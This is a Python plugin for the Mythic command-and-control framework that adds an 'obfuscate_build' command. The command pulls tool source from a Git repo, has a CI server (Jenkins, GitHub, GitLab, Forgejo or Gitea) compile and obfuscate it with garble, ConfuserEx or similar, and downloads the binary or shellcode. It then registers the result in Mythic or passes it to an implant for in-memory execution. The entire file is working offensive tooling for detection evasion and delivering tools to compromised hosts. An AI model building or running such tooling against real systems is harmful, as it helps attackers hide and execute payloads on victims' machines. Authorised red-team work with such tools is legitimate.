from __future__ import annotations

import asyncio
import json
import logging
import os
from pathlib import Path

from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterType,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
    TaskArguments,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCCallbackSearch,
    SendMythicRPCFileCreate,
    SendMythicRPCResponseCreate,
    MythicRPCCallbackSearchMessage,
    MythicRPCFileCreateMessage,
    MythicRPCResponseCreateMessage,
)

from daedalus.providers import get_provider, BuildStatus
from daedalus_ca.secrets import resolve_provider_kwargs, resolve_secret, REPO_TOKEN

logger = logging.getLogger("daedalus_ca.obfuscate_build")

_SUPPORT_FILE = Path(__file__).parent.parent / "agent_support.json"
_AGENT_SUPPORT: dict[str, dict] = {}

_BINARY_EXTS = (".exe", ".dll", ".bin", ".o", ".so", ".elf", ".cpl", ".sys")
_SKIP_SUFFIXES = (".sha256", ".sha1", ".md5", ".sig", ".asc", ".json", ".txt", ".log")

_POLL_START = 5.0
_POLL_MAX = 30.0
_POLL_BACKOFF = 1.5


def _load_support() -> dict[str, dict]:
    global _AGENT_SUPPORT
    if not _AGENT_SUPPORT:
        entries = json.loads(_SUPPORT_FILE.read_text())
        _AGENT_SUPPORT = {e["agent"]: e for e in entries}
    return _AGENT_SUPPORT


def _select_artifact(artifacts: list[dict]) -> dict | None:
    binaries = [a for a in artifacts if any(a.get("relativePath", "").lower().endswith(e) for e in _BINARY_EXTS)]
    if binaries:
        return binaries[0]
    non_meta = [a for a in artifacts if not any(a.get("relativePath", "").lower().endswith(s) for s in _SKIP_SUFFIXES)]
    if non_meta:
        return non_meta[0]
    return artifacts[0] if artifacts else None


class ObfuscateBuildArguments(TaskArguments):
    def __init__(self, command_line: str, task_id: int = 0, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="provider",
                type=ParameterType.ChooseOneCustom,
                description="CI/CD provider that runs the obfuscation pipeline",
                choices=["jenkins", "github", "gitlab", "forgejo", "gitea"],
                default_value="jenkins",
            ),
            CommandParameter(
                name="repo_url",
                type=ParameterType.String,
                description="Git clone URL for source (GitHub, Forgejo, GitLab, etc. - e.g. https://github.com/nicocha30/ligolo-ng)",
                default_value="",
            ),
            CommandParameter(
                name="repo_token",
                type=ParameterType.String,
                description="Access token for private repos",
                default_value="",
            ),
            CommandParameter(
                name="job",
                type=ParameterType.String,
                description="CI job/workflow name for the obfuscation pipeline",
            ),
            CommandParameter(
                name="language",
                type=ParameterType.ChooseOneCustom,
                description="Source language for the tools being compiled",
                choices=["c-mingw", "csharp", "rust", "go", "nim", "cpp-mingw"],
                default_value="c-mingw",
            ),
            CommandParameter(
                name="output_format",
                type=ParameterType.ChooseOneCustom,
                description="Output binary format",
                choices=["exe", "dll", "bin", "shellcode", "svc"],
                default_value="exe",
            ),
            CommandParameter(
                name="obfuscation",
                type=ParameterType.ChooseOneCustom,
                description="Obfuscation level to apply (garble for Go, ConfuserEx for .NET, etc.)",
                choices=["none", "basic", "full", "garble"],
                default_value="full",
            ),
            CommandParameter(
                name="source_path",
                type=ParameterType.String,
                description="Path within the repo to compile (directory or file, e.g. cmd/agent)",
                default_value="",
            ),
            CommandParameter(
                name="ref",
                type=ParameterType.String,
                description="Git branch or tag to build from",
                default_value="main",
            ),
            CommandParameter(
                name="tool_type",
                type=ParameterType.ChooseOne,
                description="How to handle the compiled output",
                choices=["bof", "assembly", "register_only"],
                default_value="register_only",
            ),
            CommandParameter(
                name="timeout",
                type=ParameterType.Number,
                description="Build timeout in seconds",
                default_value=300,
            ),
            CommandParameter(
                name="jenkins_url", type=ParameterType.String, description="Jenkins server URL", default_value="",
            ),
            CommandParameter(
                name="jenkins_user", type=ParameterType.String, description="Jenkins username", default_value="",
            ),
            CommandParameter(
                name="jenkins_token", type=ParameterType.String, description="Jenkins API token", default_value="",
            ),
            CommandParameter(
                name="github_token", type=ParameterType.String, description="GitHub token", default_value="",
            ),
            CommandParameter(
                name="github_owner", type=ParameterType.String, description="GitHub repo owner", default_value="",
            ),
            CommandParameter(
                name="github_repo", type=ParameterType.String, description="GitHub repo name", default_value="",
            ),
            CommandParameter(
                name="gitlab_url", type=ParameterType.String, description="GitLab server URL", default_value="",
            ),
            CommandParameter(
                name="gitlab_token", type=ParameterType.String, description="GitLab token", default_value="",
            ),
            CommandParameter(
                name="gitlab_project_id", type=ParameterType.String, description="GitLab project ID", default_value="",
            ),
            CommandParameter(
                name="forgejo_url", type=ParameterType.String, description="Forgejo server URL", default_value="",
            ),
            CommandParameter(
                name="forgejo_token", type=ParameterType.String, description="Forgejo token", default_value="",
            ),
            CommandParameter(
                name="forgejo_owner", type=ParameterType.String, description="Forgejo repo owner", default_value="",
            ),
            CommandParameter(
                name="forgejo_repo", type=ParameterType.String, description="Forgejo repo name", default_value="",
            ),
            CommandParameter(
                name="gitea_url", type=ParameterType.String, description="Gitea server URL", default_value="",
            ),
            CommandParameter(
                name="gitea_token", type=ParameterType.String, description="Gitea token", default_value="",
            ),
            CommandParameter(
                name="gitea_owner", type=ParameterType.String, description="Gitea repo owner", default_value="",
            ),
            CommandParameter(
                name="gitea_repo", type=ParameterType.String, description="Gitea repo name", default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary: dict):
        self.load_args_from_dictionary(dictionary)


class ObfuscateBuild(CommandBase):
    cmd = "obfuscate_build"
    description = (
        "Pull source from any Git repo (GitHub, Forgejo, GitLab, etc.), "
        "trigger a CI/CD obfuscation pipeline (garble, ConfuserEx, etc.) on "
        "any supported provider, then execute in-memory or register as a tool."
    )
    help_cmd = (
        "obfuscate_build -repo_url https://github.com/nicocha30/ligolo-ng "
        "-provider jenkins -job obfuscate-go -language go -obfuscation garble"
    )
    author = "@Lavender-exe"
    version = 2
    script_only = True
    argument_class = ObfuscateBuildArguments
    attackmapping = ["T1027", "T1059", "T1105"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        builtin=True,
        suggested_command=True,
        load_only=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            provider_name = (taskData.args.get_arg("provider") or os.getenv("DAEDALUS_PROVIDER", "jenkins")).lower()
            job = taskData.args.get_arg("job") or ""
            language = taskData.args.get_arg("language") or "c-mingw"
            output_format = taskData.args.get_arg("output_format") or "exe"
            obfuscation = taskData.args.get_arg("obfuscation") or "full"
            source_path = taskData.args.get_arg("source_path") or ""
            ref = taskData.args.get_arg("ref") or "main"
            tool_type = taskData.args.get_arg("tool_type") or "register_only"
            raw_timeout = taskData.args.get_arg("timeout") or 300
            timeout = int(raw_timeout) if raw_timeout else 300

            repo_url = taskData.args.get_arg("repo_url") or os.getenv("REPO_URL", "")
            repo_token = resolve_secret(taskData, "repo_token", "REPO_TOKEN", REPO_TOKEN)

            if not job and language:
                job = f"loader-{language}"
                logger.warning("Job auto-resolved from language %r → %s", language, job)

            if not job:
                raise ValueError("job is required")

            kwargs = resolve_provider_kwargs(taskData, provider_name)
            provider = get_provider(provider_name, **kwargs)

            source_display = repo_url or job
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Starting obfuscation pipeline:\n"
                    f"  Source: {source_display}/{source_path} @ {ref}\n"
                    f"  Provider: {provider_name}\n"
                    f"  Pipeline: {job} (lang={language}, fmt={output_format}, obf={obfuscation})"
                ).encode(),
            ))

            # --- Phase 1: Trigger build with obfuscation parameters ---
            build_params = {
                "LANGUAGE": language,
                "OUTPUT_FORMAT": output_format,
                "OBFUSCATION": obfuscation,
            }
            if repo_url:
                build_params["REPO_URL"] = repo_url
            if repo_token:
                build_params["REPO_TOKEN"] = repo_token
            if source_path:
                build_params["SOURCE_PATH"] = source_path
            if ref:
                build_params["REF"] = ref

            build_result = await provider.trigger_build(job, build_params)
            if not build_result.build_id:
                raise RuntimeError(f"Build trigger failed: {build_result.error or 'no build ID returned'}")

            build_id = build_result.build_id
            logger.warning("Build triggered: %s/%s #%s", provider_name, job, build_id)

            # --- Phase 2: Poll build until completion ---
            delay = _POLL_START
            elapsed = 0.0

            while elapsed < timeout:
                await asyncio.sleep(delay)
                elapsed += delay

                status = await provider.get_build_status(job, build_id)
                if status.status.is_terminal:
                    build_result = status
                    break
                delay = min(delay * _POLL_BACKOFF, _POLL_MAX)
            else:
                raise RuntimeError(f"Build timed out after {timeout}s")

            if build_result.status != BuildStatus.SUCCESS:
                raise RuntimeError(f"Build failed with status: {build_result.status.value}")

            logger.warning("Build %s/%s #%s completed: %s", provider_name, job, build_id, build_result.status.value)

            # --- Phase 3: Download artifact ---
            artifact_name = ""
            if hasattr(provider, "list_artifacts"):
                artifacts = await provider.list_artifacts(job, build_id)
                selected = _select_artifact(artifacts)
                if selected:
                    artifact_name = selected["relativePath"]

            if not artifact_name:
                artifact_name = job

            artifact_bytes = await provider.download_artifact(job, build_id, artifact_name)
            logger.warning("Downloaded %s (%d bytes)", artifact_name, len(artifact_bytes))

            # --- Phase 4: Upload to Mythic ---
            delete_after = tool_type != "register_only"
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=artifact_bytes,
                Filename=artifact_name,
                DeleteAfterFetch=delete_after,
                Comment=f"Daedalus CA: obfuscated build from {source_display}/{source_path} ({obfuscation})",
            ))
            if not file_resp.success:
                raise RuntimeError(f"File upload failed: {file_resp.error}")

            agent_file_id = file_resp.agent_file_id
            logger.warning("Uploaded to Mythic: %s", agent_file_id)

            if tool_type == "register_only":
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=(
                        f"Obfuscated {artifact_name} ({len(artifact_bytes)} bytes) registered\n"
                        f"Source: {source_display}/{source_path} @ {ref}\n"
                        f"Pipeline: {provider_name}/{job} #{build_id} (obf={obfuscation})\n"
                        f"File ID: {agent_file_id}"
                    ).encode(),
                ))
                response.DisplayParams = f"[registered] {artifact_name} ({obfuscation})"
                response.Completed = True
                return response

            # --- Phase 5: Delegate to target agent ---
            support = _load_support()
            callback_resp = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
                CallbackID=taskData.Task.CallbackID,
            ))

            target_payload_type = taskData.payload_type
            if not target_payload_type and callback_resp.success and callback_resp.results:
                target_payload_type = getattr(callback_resp.results[0], "payload_type", "") or ""

            agent_cfg = support.get(target_payload_type, {})

            if tool_type == "bof":
                native_cmd = agent_cfg.get("bof_command", "execute_coff")
                file_param = agent_cfg.get("bof_file_parameter_name", "bof_file")
                params = {file_param: agent_file_id}
            elif tool_type == "assembly":
                default_method = agent_cfg.get("assembly_default_execution_method", "execute_assembly")
                native_cmd = agent_cfg.get(f"{default_method}_command", "execute_assembly")
                file_param = agent_cfg.get(f"{default_method}_file_parameter_name", "assembly_file")
                params = {file_param: agent_file_id}
            else:
                raise ValueError(f"Unknown tool_type: {tool_type}")

            response.DisplayParams = f"[{tool_type}] {artifact_name} ({obfuscation}) from {source_display}"
            response.CommandName = native_cmd
            response.ReprocessAtNewCommandPayloadType = target_payload_type
            response.Params = json.dumps(params)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Obfuscated {artifact_name} ({len(artifact_bytes)} bytes)\n"
                    f"Source: {source_display}/{source_path} @ {ref}\n"
                    f"Pipeline: {provider_name}/{job} #{build_id} (obf={obfuscation})\n"
                    f"Delegating to {target_payload_type}/{native_cmd}"
                ).encode(),
            ))

        except Exception as e:
            logger.error("obfuscate_build failed: %s", e, exc_info=True)
            response.Success = False
            response.Error = str(e)
            response.Completed = True

        return response
